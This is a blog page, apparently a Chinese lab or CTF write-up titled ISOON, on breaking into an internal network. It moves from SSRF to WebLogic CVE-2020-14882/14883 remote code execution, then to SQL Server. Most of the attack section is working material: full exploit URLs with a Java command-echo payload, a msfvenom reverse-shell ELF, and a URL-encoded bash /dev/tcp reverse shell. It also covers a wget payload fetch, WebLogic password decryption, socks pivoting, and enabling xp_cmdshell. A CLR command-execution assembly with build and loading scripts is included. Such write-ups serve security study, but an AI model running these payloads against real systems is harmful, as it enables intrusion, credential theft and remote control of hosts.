@@ -1,0 +1,232 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>ISOON | f4l1k_blog</title><meta name="keywords" content="study"><meta name="author" content="f4l1k"><meta name="copyright" content="f4l1k"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="nmap扫描端口  8080端口有web服务，发现是个ssrf 可以读&#x2F;etc&#x2F;hosts  给了内网网段，扫一波内网主机  内网119有主机存活，继续扫描端口  http:&#x2F;&#x2F;192.168.57.119:7001有一个web服务，使用的是weblogic框架 WebLogic Server Version: 12.2.1.3.0 使用（CVE2020­14882&#x2F;14883）可以rce 无回显">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ISOON">
+<meta property="og:url" content="http://example.com/2021/10/31/general/isoon/index.html">
+<meta property="og:site_name" content="f4l1k_blog">
+<meta property="og:description" content="nmap扫描端口  8080端口有web服务，发现是个ssrf 可以读&#x2F;etc&#x2F;hosts  给了内网网段，扫一波内网主机  内网119有主机存活，继续扫描端口  http:&#x2F;&#x2F;192.168.57.119:7001有一个web服务，使用的是weblogic框架 WebLogic Server Version: 12.2.1.3.0 使用（CVE2020­14882&#x2F;14883）可以rce 无回显">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/img/fire.JPG">
+<meta property="article:published_time" content="2021-10-31T08:31:17.000Z">
+<meta property="article:modified_time" content="2021-10-31T10:06:31.488Z">
+<meta property="article:author" content="f4l1k">
+<meta property="article:tag" content="study">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/fire.JPG"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2021/10/31/general/isoon/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"We didn't find any results for the search: ${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'ISOON',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-10-31 18:06:31'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 5.4.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/konglong.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">14</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">4</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/fire.JPG')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">f4l1k_blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">ISOON</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2021-10-31T08:31:17.000Z" title="Created 2021-10-31 16:31:17">2021-10-31</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2021-10-31T10:06:31.488Z" title="Updated 2021-10-31 18:06:31">2021-10-31</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word count:</span><span class="word-count">1.4k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading time:</span><span>7min</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="ISOON"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>nmap扫描端口</p>
+<p><img src="/2021/10/31/general/isoon/image-20201210100956266.png" alt="image-20201210100956266"></p>
+<p>8080端口有web服务，发现是个ssrf</p>
+<p>可以读/etc/hosts</p>
+<p><img src="/2021/10/31/general/isoon/image-20201210101221923.png" alt="image-20201210101221923"></p>
+<p>给了内网网段，扫一波内网主机</p>
+<p><img src="/2021/10/31/general/isoon/image-20201210101547223.png" alt="image-20201210101547223"></p>
+<p>内网119有主机存活，继续扫描端口</p>
+<p><img src="/2021/10/31/general/isoon/image-20201210104627492.png" alt="image-20201210104627492"></p>
+<p><a href="http://192.168.57.119:7001有一个web服务，使用的是weblogic框架">http://192.168.57.119:7001有一个web服务，使用的是weblogic框架</a></p>
+<p>WebLogic Server Version: 12.2.1.3.0</p>
+<p>使用（CVE2020­14882/14883）可以rce</p>
+<h3 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h3><p>我们可以利用msf生成一个elf马</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=192.168.10.191 lport=5555 -f elf &gt; test.elf</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.57.119:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&amp;_pageLabel=&amp;handle=com.tangosol.coherence.mvel2.sh.ShellSession(&quot;java.lang.Runtime.getRuntime().exec(&#x27;wget http://192.168.10.192/test.elf&#x27;);&quot;)</span><br></pre></td></tr></table></figure>
+<p>需要权限+X</p>
+<h3 id="有回显"><a href="#有回显" class="headerlink" title="有回显"></a>有回显</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.57.119:7001/console/css/%25%32%65%25%32%65%25%32%66consolejndi.portal?test_handle=com.tangosol.coherence.mvel2.sh.ShellSession(&#x27;weblogic.work.ExecuteThread currentThread = (weblogic.work.ExecuteThread)Thread.currentThread(); weblogic.work.WorkAdapter adapter = currentThread.getCurrentWork(); java.lang.reflect.Field field = adapter.getClass().getDeclaredField(&quot;connectionHandler&quot;);field.setAccessible(true);Object obj = field.get(adapter);weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod(&quot;getServletRequest&quot;).invoke(obj); String cmd = req.getParameter(&quot;cmd&quot;);String[] cmds = System.getProperty(&quot;os.name&quot;).toLowerCase().contains(&quot;window&quot;) ? new String[]&#123;&quot;cmd.exe&quot;, &quot;/c&quot;, cmd&#125; : new String[]&#123;&quot;/bin/sh&quot;, &quot;-c&quot;, cmd&#125;;if(cmd != null )&#123; String result = new java.util.Scanner(new java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter(&quot;\\A&quot;).next(); weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod(&quot;getResponse&quot;).invoke(req);res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();&#125; currentThread.interrupt();&#x27;)&amp;cmd=whoami</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/10/31/general/isoon/image-20201210103713000.png" alt="image-20201210103713000"></p>
+<p>将payload编码一下，利用ssrf弹bash</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.57.119:7001/console/css/%2e%2e%2fconsolejndi.portal?test_handle=com.tangosol.coherence.mvel2.sh.ShellSession(&#x27;weblogic.work.ExecuteThread currentThread = (weblogic.work.ExecuteThread)Thread.currentThread(); weblogic.work.WorkAdapter adapter = currentThread.getCurrentWork(); java.lang.reflect.Field field = adapter.getClass().getDeclaredField(&quot;connectionHandler&quot;);field.setAccessible(true);Object obj = field.get(adapter);weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod(&quot;getServletRequest&quot;).invoke(obj); String cmd = req.getParameter(&quot;cmd&quot;);String[] cmds = System.getProperty(&quot;os.name&quot;).toLowerCase().contains(&quot;window&quot;) ? new String[]&#123;&quot;cmd.exe&quot;, &quot;/c&quot;, cmd&#125; : new String[]&#123;&quot;/bin/sh&quot;, &quot;-c&quot;, cmd&#125;;if(cmd != null )&#123; String result = new java.util.Scanner(new java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter(&quot;\\A&quot;).next(); weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod(&quot;getResponse&quot;).invoke(req);res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();&#125; currentThread.interrupt();&#x27;)&amp;cmd=%62%61%73%68%20%2d%63%20%27%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%39%32%2e%31%36%38%2e%31%30%2e%31%39%31%2f%34%34%34%34%20%30%3e%26%31%27</span><br></pre></td></tr></table></figure>
+
+<p>cmd是经过url编码的bash</p>
+<p><img src="/2021/10/31/general/isoon/image-20201210103954589.png" alt="image-20201210103954589"></p>
+<p>拿到shell后我们要信息收集，在/home/weblogic/Oracle/Middleware/user_projects/domains/iSoonDomain/config/jdbc</p>
+<p>有个配置文件发现连了数据库</p>
+<p><img src="/2021/10/31/general/isoon/image-20201210105604364.png" alt="image-20201210105604364"></p>
+<p>将/home/weblogic/Oracle/Middleware/user_projects/domains/iSoonDomain/security、SerializedSystemIni.dat</p>
+<p>利用<a target="_blank" rel="noopener" href="https://github.com/Ch1ngg/WebLogicPasswordDecryptorUi">weblogic解密工具</a>可以解出密码</p>
+<p><img src="/2021/10/31/general/isoon/image-20201210105959231.png" alt="image-20201210105959231"></p>
+<p>我们需要用这台机器当跳板机来连mssql，所以我们需要个代理</p>
+<p>可以使用<code>ew</code>或<code>msf</code></p>
+<blockquote>
+<p><strong>EW</strong></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/idlefire/ew">https://github.com/idlefire/ew</a></p>
+<p>公网</p>
+<blockquote>
+<p>./ew_for_linux64 -s rcsocks -l 转发端口 -e 接收端口</p>
+</blockquote>
+<p>内网</p>
+<p>./ew_for_linux64 -s rssocks -d 目的ip -e 发送端口</p>
+</blockquote>
+<blockquote>
+<p><strong>msf</strong></p>
+<p>run get_local_subnets # 获取内网网段</p>
+<p>run autoroute -s 10.223.71.0/24 # route add 目的ip 255.255.255.0 [session id] 两种方法都可以，第二种方式需在session外</p>
+<p>use auxiliary/server/socks5</p>
+<blockquote>
+<p>SRVHOST   0.0.0.0          yes       The address to listen on<br>SRVPORT   1080             yes       The port to listen on</p>
+</blockquote>
+</blockquote>
+<p>使用navicat连sqlserver</p>
+<p>可以开启xp_cmdshell存储进程来执行命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">--打开xp_cmdshell</span><br><span class="line"> EXEC sp_configure &#x27;show advanced options&#x27;, 1;RECONFIGURE;EXEC sp_configure &#x27;xp_cmdshell&#x27;, 1;RECONFIGURE;</span><br><span class="line">--关闭xp_cmdshell</span><br><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;, 1;RECONFIGURE;EXEC sp_configure &#x27;xp_cmdshell&#x27;, 0;RECONFIGURE;</span><br></pre></td></tr></table></figure>
+
+<p>执行</p>
+ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec xp_cmdshell &#x27;whoami&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/10/31/general/isoon/image-20201210110908057.png" alt="image-20201210110908057"></p>
+<p>预期解说是利用clr</p>
+<p>将下面代码保存为cmd_exec.cs</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">using System.Data;</span><br><span class="line">using System.Data.SqlClient;</span><br><span class="line">using System.Data.SqlTypes;</span><br><span class="line">using Microsoft.SqlServer.Server;</span><br><span class="line">using System.IO;</span><br><span class="line">using System.Diagnostics;</span><br><span class="line">using System.Text;</span><br><span class="line"></span><br><span class="line">public partial class StoredProcedures</span><br><span class="line">&#123;</span><br><span class="line">    [Microsoft.SqlServer.Server.SqlProcedure]</span><br><span class="line">    public static void cmd_exec (SqlString execCommand)</span><br><span class="line">    &#123;</span><br><span class="line">        Process proc = new Process();</span><br><span class="line">        proc.StartInfo.FileName = @&quot;C:\Windows\System32\cmd.exe&quot;;</span><br><span class="line">        proc.StartInfo.Arguments = string.Format(@&quot; /C &#123;0&#125;&quot;, execCommand.Value);</span><br><span class="line">        proc.StartInfo.UseShellExecute = false;</span><br><span class="line">        proc.StartInfo.RedirectStandardOutput = true;</span><br><span class="line">        proc.Start();</span><br><span class="line"></span><br><span class="line">        // Create the record and specify the metadata for the columns.</span><br><span class="line">        SqlDataRecord record = new SqlDataRecord(new SqlMetaData(&quot;output&quot;, SqlDbType.NVarChar, 4000));</span><br><span class="line"></span><br><span class="line">        // Mark the beginning of the result set.</span><br><span class="line">        SqlContext.Pipe.SendResultsStart(record);</span><br><span class="line"></span><br><span class="line">        // Set values for each column in the row</span><br><span class="line">        record.SetString(0, proc.StandardOutput.ReadToEnd().ToString());</span><br><span class="line"></span><br><span class="line">        // Send the row back to the client.</span><br><span class="line">        SqlContext.Pipe.SendResultsRow(record);</span><br><span class="line"></span><br><span class="line">        // Mark the end of the result set.</span><br><span class="line">        SqlContext.Pipe.SendResultsEnd();</span><br><span class="line"></span><br><span class="line">        proc.WaitForExit();</span><br><span class="line">        proc.Close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>windows  .net自带csc.exe，下面命令可以找到csc.exe路径</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-ChildItem -Recurse &quot;C:\Windows\Microsoft.NET\&quot; -Filter &quot;csc.exe&quot; | Sort-Object fullname -Descending | Select-Object fullname -First 1 -ExpandProperty fullname</span><br></pre></td></tr></table></figure>
+
+<p>然后编译</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:library C:/Users/kai/Desktop/cmd_exec.cs</span><br></pre></td></tr></table></figure>
+
+<p>我们需要将dll文件转成hex才能使用,使用下方powershell脚本可以转</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$assemblyFile = &quot;C:\Users\kai\Desktop\cmd_exec.dll&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$stringBuilder = New-Object -Type System.Text.StringBuilder </span><br><span class="line">$stringBuilder.Append(&quot;CREATE ASSEMBLY [my_assembly] AUTHORIZATION [dbo] FROM `n0x&quot;) | Out-Null</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$fileStream = [IO.File]::OpenRead($assemblyFile)</span><br><span class="line">while (($byte = $fileStream.ReadByte()) -gt -1) &#123;</span><br><span class="line">    $stringBuilder.Append($byte.ToString(&quot;X2&quot;)) | Out-Null</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$stringBuilder.AppendLine(&quot;\nWITH PERMISSION_SET = UNSAFE&quot;) | Out-Null</span><br><span class="line">$stringBuilder.AppendLine(&quot;GO&quot;) | Out-Null</span><br><span class="line">$stringBuilder.AppendLine(&quot; &quot;) | Out-Null</span><br><span class="line"></span><br><span class="line">$stringBuilder.AppendLine(&quot;CREATE PROCEDURE [dbo].[cmd_exec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [my_assembly].[StoredProcedures].[cmd_exec];&quot;) | Out-Null</span><br><span class="line">$stringBuilder.AppendLine(&quot;GO&quot;) | Out-Null</span><br><span class="line">$stringBuilder.AppendLine(&quot; &quot;) | Out-Null</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$stringBuilder.AppendLine(&quot;EXEC[dbo].[cmd_exec] &#x27;whoami&#x27;&quot;) | Out-Null</span><br><span class="line">$stringBuilder.AppendLine(&quot;GO&quot;) | Out-Null</span><br><span class="line">$stringBuilder.AppendLine(&quot; &quot;) | Out-Null</span><br><span class="line"></span><br><span class="line">$stringBuilder.ToString() -join &quot;&quot; | Out-File C:\Users\kai\Desktop\cmd_exec.txt</span><br></pre></td></tr></table></figure>
+
+<p>以sysadmin登录mssql执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Sp_Configure &#x27;clr enabled&#x27;, 1</span><br><span class="line">RECONFIGURE</span><br><span class="line">GO</span><br><span class="line"></span><br><span class="line">ALTER DATABASE master SET TRUSTWORTHY ON;</span><br><span class="line">GO</span><br><span class="line"></span><br><span class="line">CREATE ASSEMBLY [my_assembly] AUTHORIZATION [dbo] FROM </span><br><span class="line">0x4D5A90000300000004000000F[TRUNCATED]</span><br><span class="line">WITH PERMISSION_SET = UNSAFE </span><br><span class="line">GO </span><br><span class="line"></span><br><span class="line">CREATE PROCEDURE [dbo].[cmd_exec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [my_assembly].[StoredProcedures].[cmd_exec];</span><br><span class="line">GO</span><br><span class="line"> </span><br><span class="line">EXEC[dbo].[cmd_exec] &#x27;whoami&#x27;</span><br><span class="line">GO</span><br></pre></td></tr></table></figure>
+
+<p>使用<code>cmd_exec &#39;whoami&#39;</code>就可以执行命令</p>
+<p>但是此机器无外网 ，无法反弹webshell</p>
+<p>不过msf如果监听的是跳板机，那他会在跳板机开一个端口监听，直接反向链接（ps:u1s1王神真强</p>
+<p>使用msf自带payload</p>
+<p><img src="/2021/10/31/general/isoon/image-20201210202255351.png" alt="image-20201210202255351"></p>
+<p>成功弹到shell</p>
+<p>whoami  /priv 发现有<code>SeImpersonatePrivilege</code>权限</p>
+<p>可以使用potato提权</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">f4l1k</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://example.com/2021/10/31/general/isoon/">http://example.com/2021/10/31/general/isoon/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/study/">study</a></div><div class="post_share"><div class="social-share" data-image="/img/fire.JPG" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/10/31/general/docker%E5%92%8Cphpstorm%E6%90%AD%E5%BB%BAphp%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/"><img class="prev-cover" src="/img/fire.JPG" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">docker和phpstorm搭建php开发环境</div></div></a></div><div class="next-post pull-right"><a href="/2021/10/31/general/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><img class="next-cover" src="/img/fire.JPG" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">初探java反序列化</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/2021/10/31/general/docker%E5%92%8Cphpstorm%E6%90%AD%E5%BB%BAphp%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/" title="docker和phpstorm搭建php开发环境"><img class="cover" src="/img/fire.JPG" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-10-31</div><div class="title">docker和phpstorm搭建php开发环境</div></div></a></div><div><a href="/2021/10/31/general/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="初探java反序列化"><img class="cover" src="/img/fire.JPG" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-10-31</div><div class="title">初探java反序列化</div></div></a></div><div><a href="/2021/10/31/general/ssh%E9%9A%A7%E9%81%93/" title="ssh隧道"><img class="cover" src="/img/fire.JPG" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-10-31</div><div class="title">ssh隧道</div></div></a></div><div><a href="/2021/10/31/general/%E5%88%9D%E6%8E%A2pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="初探pickle反序列化"><img class="cover" src="/img/fire.JPG" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-10-31</div><div class="title">初探pickle反序列化</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/konglong.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">f4l1k</div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">14</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">4</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/falipan"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/falipan" target="_blank" title="Github"><i class="fab fa-github"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E5%9B%9E%E6%98%BE"><span class="toc-number">1.</span> <span class="toc-text">无回显</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%89%E5%9B%9E%E6%98%BE"><span class="toc-number">2.</span> <span class="toc-text">有回显</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/10/31/general/DASCTF/" title="DASCTF"><img src="/img/fire.JPG" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="DASCTF"/></a><div class="content"><a class="title" 